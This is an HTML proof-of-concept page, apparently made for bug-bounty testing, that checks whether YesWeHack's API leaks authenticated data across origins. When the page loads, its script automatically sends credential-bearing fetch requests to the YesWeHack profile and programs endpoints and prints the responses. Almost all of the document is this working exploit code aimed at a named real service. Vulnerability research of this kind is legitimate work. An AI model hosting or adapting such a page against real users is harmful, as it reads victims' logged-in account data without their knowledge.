<!DOCTYPE html>
<html>
<head>
  <title>YesWeHack CORS Credential Theft PoC</title>
  <style>
    body { font-family: Arial, background: #111; color: #0f0; padding: 20px; }
    pre  { background: #000; padding: 10px; border: 1px solid #0f0; white-space: pre-wrap; }
    h2   { color: #0f0; }
  </style>
</head>
<body>
  <h2>YesWeHack CORS Credential Theft PoC</h2>
  <p>If this page (on <strong>spycifawx.github.io</strong> or another non-YesWeHack domain)
     can read authenticated API responses from <code>yeswehack.com</code>, CORS is broken.</p>

  <pre id="output">Running PoC...</pre>

  <script>
    async function attack() {
      const output = document.getElementById('output');

      const endpoints = [
        "https://api.yeswehack.com/me",          // example: current user profile
        "https://api.yeswehack.com/programs",    // example: programs list
        "https://yeswehack.com/api/user/profile" // example: web-app endpoint
      ];

      let results = "";

      for (const url of endpoints) {
        try {
          const res = await fetch(url, {
            method: "GET",
            credentials: "include"
          });

          const text = await res.text();

          results += `==============================\n`;
          results += `[${url}]\n`;
          results += `STATUS: ${res.status}\n`;
          results += `${text}\n\n`;
        } catch (err) {
          results += `==============================\n`;
          results += `[${url}]\n`;
          results += `ERROR: ${err}\n\n`;
        }
      }

      output.textContent = results;
    }

    attack();
  </script>
</body>
</html>
